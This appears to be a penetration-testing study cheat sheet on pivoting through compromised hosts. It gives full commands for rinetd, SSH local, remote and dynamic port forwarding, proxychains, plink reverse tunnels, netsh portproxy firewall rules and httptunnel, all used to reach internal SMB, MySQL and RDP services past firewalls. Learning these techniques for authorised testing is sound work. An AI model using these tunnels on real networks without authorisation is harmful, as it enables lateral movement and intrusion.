RINETD:<
WITH RINETD INSTALLED ON A DESIGNATED PIVOT SERVER YOU CAN ADD RULES TO /etc/rinetd.conf TO REDIRECT TRAFFIC I.E.

0.0.0.0 80 target.ip.add.here 80 

LISTENS ON LOWJACK FOR INCOMING CONNECTIONS FOR PORT 80 AND FORWARDS THEM TO THE TARGET IP:80

SSH TUNNELING:<

iptables_rules.SH
------------------------

#!/bin/bash

#CLEAR RULES
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables- F
iptables -X

#SSH RULES
iptables -F 
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp --dport 3389 -m state --state NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 8080 -m state --state NEW -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT

IN THIS CASE WE'VE ALLOWED TRAFFIC THROUGH THE PORTS LISTED ABOVE FOR THE PURPOSE OF PIVOTING
WE CAN THEN USE AN SSH SYNTAX SIMILAR TO

ssh -N -L [bindaddress:]port:host:hostport USERNAME@ADDRESS

SO FOR INSTANCE IF WE WANTED TO DIRECT TRAFFIC ON PORT 445 TO A COMPUTER LOCATED AT 192.168.1.10 
THAT WE DO NOT HAVE DIRECT ACCESS TO FROM OUR COMPUTER, BUT HAVE ACCESS TO THROUGH A MACHINE WE HAVE COMPRIMISED
AT 10.11.1.1 WE WOULD USE
sudo ssh -N -L 0.0.0.0:445:192.168.1.10:445 PIVOT@10.11.1.1

REMEMBER TO CHECK /etc/samba/smb.conf FOR MINIMUM VERSION

AND THEN DIRECT ANY UTILITIES WE PLAN TO USE ON OUR POST-PIVOT TARGET TO 127.0.0.1 I.E.
smbclient -L 127.0.0.1 -U Administrator

YOU CAN ALSO USE SSH TO REMOTE PORT FORWARD AS OPPOSED TO LOCAL, I.E. IF YOU HAVE A SHELL ON A SYSTEM BUT CAN'T SSH TO THE SYSTEM
YOU CAN STILL USE REMOTE PORT FORWARDING TO REVERSE TRAFFIC FROM A SERVICE BACK TO YOURSELF

ssh -N -R your.ip.add.here:2221:127.0.0.1:3306 yoU@your.ip.add.here

WILL ALLOW ANY TRAFFIC SENT TO YOUR PORT 2221 TO BE FORWARDED TO THE TARGET'S PORT 3306 (MYSQL) 
THIS TACTIC MAY BE USEFUL FOR CIRCUMVENTING FIREWALL RULES

ON YOUR MACHINE YOU CAN VERIFY THAT THE PORT IS LISTENING WITH
ss -antp | grep "2221"
 YOU CAN THEN NMAP SCAN YOUR LOCAL PORT 2221 TO SEE THE RUNNING SERVICE ON THE TARGET MACHINE
 



SSH DYNAMIC PORT FORWARDING:<<<<<<<<<

YOU CAN USED THE -D FLAG WITH SSH TO DETERMINE DYNAMIC FORWARDING

sudo ssh -N -D 127.0.0.1:8080 student@targ.ip.he.re

AND THEN USE PROXYCHAINS TO TAKE ADVANTAGE OF DYNAMIC FORWARDING BY ADDING 
socks4 127.0.0.1 8080
TO /etc/proxychains.conf, ALTHOUGH I THINK IT CAN HANDLE V5 AS WELL AND OTHER MEANS OF PROXY
AND THEN PREPEND PROXYCHAINS TO YOUR COMMANDS I.E.
sudo proxychains nmap ip.add.he.re
 
WINDOWS BASED TUNNLEING:<<<<<<<<<<<<<<

PLINK.EXE:<<
IF WE CAN SUCCESSFULLY TRANSFER PLINK TO A WINDOWS TARGET WE CAN LEVERAGE THIS AS AN SSH CLIENT

FOR EXAMPLE WE COULD CREATE A REVERS TUNNEL OF THE MYSQL PORT BACK FROM A WINDOWS MACHINE VIA

cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R YOUR.ip.he.re:1234:127.0.0.1:3306 your.ip.he.re

WHERE
-l IS THE USER
-pw IS THE PASSWORD
-R IS THE REMOTE PORT FORWARD

IF YOU HAVE SYSTEM ON A WINDOWS MACHINE, AND IPHELPER AND IPV6 SUPPORT ARE AVAILABLE WE CAN LEVERAGE

NETSH:<<<

FOR INSTANCE WE CAN REDIRECT TRAFFIC FROM 4455 ON OUR LOCAL MACHINE TO 445 ON A DIFFERENT MACHINE USING THIS SYNTAX

netsh interface portproxy add v4tov4 listenport=4455 listenaddress=pivot.ip.he.re connectport=445 connectaddress=targ.ip.he.re

WE CAN ALLOW 4455 TRAFFIC IN THE FIREWALL BY USING

 netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=pivot.ip.he.re localport=4455 action=allow

THEN DIRECT SMBLIENT THROUGH PORT 4455

smbclient -L pivot.ip.he.re --port=4455 --user=Administrator

AND ATTEMPT TO MOUNT A SHARE

sudo mkdir /mnt/win10share

sudo mount -t cifs -o port=4455 //pivot.ip.he.re/sharename -o username=Administrator,password=pass /mnt/win10share


HTTPTUNNELING:<<<

FOR THIS EXAMPLE YOULL WANT TO ACCEPT ON PORT 1234, 80, 443

iptables -A INPUT -p tcp --dport 80 -m state --state NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -m state --state NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 1234 -m state --state NEW -j ACCEPT

INSTALL HTTPTUNNEL, AND WE WILL USE IT TO TUNNEL INFORMATION OVER THE HTTP PROTOCOL


FOR THIS EXAMPLE WE HAVE A SHELL ON AN INTERNAL LINUX SERVER AND WE ARE CONNECTED VIA PORT 443
WE ARE GOING TO FORWARD TRAFFIC TO A WINDOWS MACHINES PORT 3389 FROM PORT 8888
THIS WILL WORK BECAUSE THEY ARE ON THE SAME NETWORK BUT OUR KALI MACHINE BUT OUR MACHINE IS ON THE OTHER SIDE OF A BLOCKED 
SSH PROTOCOL FIREWALL RULE
SO HOW WE FIX THE ISSUE IS USING AN HTTP TUNNEL TO THE LINUX SERVER FOR TRAFFIC AND THEN FORWARDING 
THE TRAFFIC THROUGH ANOTHER PORT ON THE LINUX MACHINE TO THE WINDOWS MACHINE USING THE SSH LOCAL FORWARD

ON OUR COMPROMISED LINUX SERVER

ssh -L 0.0.0.0:8888:win.mach.ine.ip:3389

AND

hts --forward-port localhost:8888 1234

ON OUR MACHINE

htc --forward-port 8080 lin.mach.ip.add:1234

THEN 
rdesktop 127.0.0.1:8080
WILL FORWARD TRAFFIC OVER THE CHAIN TO THE WINDOWS CLIENT


